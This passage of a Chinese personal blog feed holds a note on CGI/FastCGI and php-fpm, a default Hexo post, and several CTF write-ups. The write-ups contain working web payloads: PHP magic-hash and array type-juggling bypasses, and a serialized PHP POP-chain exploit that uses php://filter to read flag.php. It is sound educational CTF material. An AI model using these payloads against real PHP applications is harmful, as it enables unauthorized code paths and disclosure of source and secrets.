Server时，FastCGI进程管理器选择并连接到一个CGI解释器。WebServer将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</li><li>FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回WebServer。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行WebServer中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</li></ol><h2 id="php-cgi"><a href="#php-cgi" class="headerlink" title="php-cgi"></a>php-cgi</h2><blockquote><p>php-cgi是php提供给web serve也就是http前端服务器的<strong>cgi协议接口程序</strong>，当每次接到http前端服务器的请求都会开启一个php-cgi进程进行处理，而且开启的php-cgi的过程中会先要重载配置，数据结构以及初始化运行环境，如果更新了php配置，那么就需要重启php-cgi才能生效，这也是php-cgi的不足之处。</p></blockquote><p>这里需要注意的是：php-cgi不是php脚本的解析器，它是cgi协议的解析器，然后通过调用php的php_execute_script函数来解析和运行php脚本。</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559006.jpg" alt="img"></p><h2 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h2><blockquote><p>php-fpm是php提供给web serve也就是http前端服务器的<strong>fastcgi协议接口程序</strong>，它不会像php-cgi一样每次连接都会重新开启一个进程，处理完请求又关闭这个进程，而是允许一个进程对多个连接进行处理，而不会立即关闭这个进程，而是会接着处理下一个连接。它可以说是php-cgi的一个管理程序，是对php-cgi的改进。</p></blockquote><p>换句话说：php-fpm其实是升级版的php-cgi，但是最后处理的单元仍然是一个php-cgi程序，php-fpm可以更好的去调度资源来实现fastcgi协议。</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559007.jpg" alt="img"></p><p><strong>重点PS：</strong>在刚才配置lnmp过程中，我们安装了php-fpm包，在配置lamp过程中并没有安装，这是为什么呢？</p><p>答：apache使用的是一种名为mod_php模式去解析php的，即mod_php 模式是将php模块安装到apache中，apache每接收一个请求，都会产生一个进程来连接php-cgi来完成请求，可想而知，如果一旦用户过多，并发数过多，服务器就会承受不住了。</p><p>而Nginx只负责反向代理/请求转发,不负责管理php-cgi进程,所以Nginx一般配合能够自行管理工作进程(子进程)的php-fpm使用。Nginx不能像Apache那样直接执行外部可执行程序，但Nginx可以作为代理服务器，将请求转发给后端服务器，这也是Nginx的主要作用之一。</p><h2 id="Spawn-FCGI"><a href="#Spawn-FCGI" class="headerlink" title="Spawn-FCGI"></a>Spawn-FCGI</h2><blockquote><p>Spawn-FCGI是一个通用的FastCGI管理服务器，它是lighttpd中的一部份，很多人都用Lighttpd的Spawn-FCGI进行FastCGI模式下的管理工作，不过有不少缺点。Spawn-FCGI目前已经独成为一个项目，更加稳定一些，也给很多Web 站点的配置带来便利。已经有不少站点将它与nginx搭配来解决动态网页。</p></blockquote><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>CGI和FastCGI严格意义上来说是协议，CGI进程和FastCGI进程就是具有该协议特性的进程。</li><li>php-cgi和php-fpm都是协议接口程序，用来管理采用不同协议的php-cgi程序，前者管理cgi进程，后者管理fastcgi进程。</li><li>spawn-fcgi和php-fpm作用相同，都是fastcgi进程管理器。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/2021-08/hello-world/"/>
      <url>/post/2021-08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF X DASCTF应急挑战杯</title>
      <link href="/post/2021-06/GKCTF&amp;DASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/"/>
      <url>/post/2021-06/GKCTF&amp;DASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>web太难，一道也没做出来，55555！</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>追踪http流找到QER1=cat+%2Ff14g%7Cbase64<br>将底下的十六进制换成ascii字符集显示,base64解码一次,倒序一次,再base64解码得到flag的双写,去掉重复的之后提交<br>flag{Welc0me_GkC4F_m1siCCCCCC!}</p><h2 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h2><p>使用VDubAPNGMod打开,逐张检查,发现四个二维码<br>第一个使用Office Lens直接提取<br>第二个降低亮度<br>第三四个正常扫描<br>得到的flag拼在一起</p><h2 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h2><p>昵称123 进游戏</p><p>箱子里有本start的书</p><p>打开有个坐标 255 71 -41(书里写的是255 -41 71)</p><p>旁边的日记里记着x 坐标是386</p><p>出门接到misc奶奶的任务打到web狗</p><p>直接指令 /tp 255 71 -41</p><p>打死掉了第二本书</p><p>接着 /tp 291 67 -95 打死谜语人</p><p>/tp 324 79 -190 打死re</p><p>/tp 362 69 -144 打死pwn神</p><p>集齐四本书得到flag</p><p><strong>GKCTF{w3lc0me_t0_9kctf_2021_Check_1n}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021陕西省大学生网络安全技能大赛</title>
      <link href="/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/post/2021-06/%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web-ez-checkin"><a href="#web-ez-checkin" class="headerlink" title="web ez_checkin"></a>web ez_checkin</h2><ul><li>进去看了一会，啥也没找到，直接上dirsearch</li></ul><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062021375.png" alt="1"></p><ul><li>扫到一个index.php~,打开看一看,是php审计</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Come and hack me&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>] == hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Welcome to level 2!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) == md5(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>])))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Welcome to level 3!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;Come on !  One more trick!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;What R U doing?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????????????&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>一共有三层判断，只要绕过这三层就可以获得flag</p></li><li><h3 id="第一层是一个MD4绕过"><a href="#第一层是一个MD4绕过" class="headerlink" title="第一层是一个MD4绕过"></a>第一层是一个MD4绕过</h3></li><li><p>使用0e的科学计数法即可绕过</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>] == hash(<span class="string">&quot;md4&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;param1&quot;</span>])</span><br></pre></td></tr></table></figure><ul><li>payload：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//9cff3263.yunyansec.com/index.php</span></span><br><span class="line">?param1=<span class="number">0e251288019</span></span><br></pre></td></tr></table></figure><ul><li>成功到达第二层</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) == md5(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param3&#x27;</span>]))</span><br></pre></td></tr></table></figure><ul><li><h3 id="双MD5碰撞绕过"><a href="#双MD5碰撞绕过" class="headerlink" title="双MD5碰撞绕过"></a>双MD5碰撞绕过</h3></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MD5大全：</span><br><span class="line"> </span><br><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line"> </span><br><span class="line">md5(CbDLytmyGm2xQyaLNhWn) =&gt; <span class="number">0</span>ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line"> </span><br><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; <span class="number">0e3</span>a5f2a80db371d4610b8f940d296af</span><br><span class="line"> </span><br><span class="line"><span class="number">770</span>hQgrBOjrcqftrlaZk</span><br><span class="line"> </span><br><span class="line">md5(<span class="number">770</span>hQgrBOjrcqftrlaZk) =&gt; <span class="number">0e689</span>b4f703bdc753be7e27b45cb3625</span><br><span class="line"> </span><br><span class="line">md5(md5(<span class="number">770</span>hQgrBOjrcqftrlaZk)) =&gt; <span class="number">0e2756</span>da68ef740fd8f5a5c26cc45064</span><br><span class="line"> </span><br><span class="line"><span class="number">7</span>r4lGXCH2Ksu2JNT3BYM</span><br><span class="line"> </span><br><span class="line">md5(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM) =&gt; <span class="number">0e269</span>ab12da27d79a6626d91f34ae849</span><br><span class="line"> </span><br><span class="line">md5(md5(<span class="number">7</span>r4lGXCH2Ksu2JNT3BYM)) =&gt; <span class="number">0e48</span>d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure><ul><li>payload:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://9cff3263.yunyansec.com/index.php</span><br><span class="line">?param1=0e251288019</span><br><span class="line">&amp;param2=0ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">&amp;param3=CbDLytmyGm2xQyaLNhWn</span><br></pre></td></tr></table></figure><ul><li>成功到达第三层</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>]  &amp;&amp;  md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param4&#x27;</span>]) === md5(<span class="variable">$_GET</span>[<span class="string">&#x27;param5&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li><h3 id="一个简单的MD5碰撞"><a href="#一个简单的MD5碰撞" class="headerlink" title="一个简单的MD5碰撞"></a>一个简单的MD5碰撞</h3></li><li><p>直接使用数组传值，md5()无法处理数组，都会返回NULL</p></li><li><p>最终payload:</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//9cff3263.yunyansec.com/index.php</span></span><br><span class="line">?param1=<span class="number">0e251288019</span></span><br><span class="line">&amp;param2=<span class="number">0</span>ec20b7c66cafbcc7d8e8481f0653d18</span><br><span class="line">&amp;param3=CbDLytmyGm2xQyaLNhWn</span><br><span class="line">&amp;param4[]=<span class="number">1</span></span><br><span class="line">&amp;param5[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062021377.png" alt="2"></p><blockquote><p>flag{a869a5ea62bd6a8d2a9294dbc51c58ff}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezpop</title>
      <link href="/post/2021-06/%5BMRCTF2020%5DEzpop/"/>
      <url>/post/2021-06/%5BMRCTF2020%5DEzpop/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><h3 id="考点：1-pop链的构造-2-伪协议"><a href="#考点：1-pop链的构造-2-伪协议" class="headerlink" title="考点：1. pop链的构造        2.伪协议"></a>考点：1. pop链的构造        2.伪协议</h3><ul><li>先看看源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>想办法到达Modifier类进行文件包含</p><p>上一个pop链的题没有记录写魔术方法，这次大概记录一下魔术方法的作用</p><table><thead><tr><th align="center">魔术方法</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct()</td><td align="center">当对象被创建时会调用此方法</td></tr><tr><td align="center">__destrurct()</td><td align="center">在某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td align="center">__sleep()</td><td align="center">当对象被序列化时会调用此方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">当对象被反序列化时将会调用此方法</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问属性的值时，该方法被调用</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，该方法被调用</td></tr><tr><td align="center">__toString()</td><td align="center">当一个类被当作字符串时将会调用此方法</td></tr><tr><td align="center">__invoke()</td><td align="center">当尝试以调用函数的方式调用一个对象时该方法会被调用</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用 isset() 或 empty() 时，该方法会被调用</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用 unset() 时，该方法会被调用</td></tr></tbody></table><p>就先这么多吧！</p><ul><li>构造代码:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$b</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a4ef15f6-3d4e-416b-bc25-7ae776bf191f.node3.buuoj.cn/?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>然后再进行base64解码得到flag</p>]]></content>
      
      
      <categories>
          
